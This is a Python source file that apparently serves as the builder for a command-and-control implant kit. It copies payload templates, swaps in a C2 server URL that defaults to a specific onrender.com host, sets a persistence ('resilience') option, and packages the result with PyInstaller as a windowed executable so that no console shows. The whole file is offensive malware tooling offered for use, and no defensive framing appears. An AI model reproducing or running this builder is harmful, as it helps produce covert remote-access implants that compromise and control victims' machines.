import os
import subprocess
import shutil

def build_payload(payload_name, c2_url, resilience_enabled, output_dir="."):
    """Dynamically creates and builds a payload executable using PyInstaller."""
    
    # --- Step 1: Create a temporary build directory ---
    build_dir = os.path.join(output_dir, "build_temp")
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)
    
    # --- Step 2: Copy payload template files ---
    template_dir = "payload_template"
    for filename in os.listdir(template_dir):
        shutil.copy(os.path.join(template_dir, filename), build_dir)

    # --- Step 3: Modify the templates with user settings ---
    # Modify comms.py
    comms_path = os.path.join(build_dir, "comms.py")
    with open(comms_path, "r") as f:
        content = f.read()
    content = content.replace('https://tether-c2-communication-line-by-ebowluh.onrender.com', c2_url)
    with open(comms_path, "w") as f:
        f.write(content)

    # Modify payload.py
    payload_path = os.path.join(build_dir, "payload.py")
    with open(payload_path, "r") as f:
        content = f.read()
    content = content.replace('ENABLE_RESILIENCE = True', f'ENABLE_RESILIENCE = {resilience_enabled}')
    with open(payload_path, "w") as f:
        f.write(content)
        
    # Modify resilience.py
    resilience_path = os.path.join(build_dir, "resilience.py")
    with open(resilience_path, "r") as f:
        content = f.read()
    content = content.replace('payload_main.exe', f'{payload_name}.exe')
    with open(resilience_path, "w") as f:
        f.write(content)

    # --- Step 4: Run PyInstaller ---
    icon_path = os.path.join(template_dir, "icon.ico") # Assumes you might add an icon file
    pyinstaller_cmd = [
        'pyinstaller',
        '--noconfirm',
        '--onefile',
        '--windowed', # Hides the console window
        '--distpath', output_dir,
        '--name', payload_name,
        os.path.join(build_dir, 'payload.py')
    ]

    try:
        subprocess.run(pyinstaller_cmd, check=True)
        print(f"[*] Build successful! Payload saved as {payload_name}.exe in {output_dir}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Build failed: {e}")
        return False
    finally:
        # --- Step 5: Clean up ---
        shutil.rmtree(build_dir)
        if os.path.exists(f"{payload_name}.spec"):
            os.remove(f"{payload_name}.spec")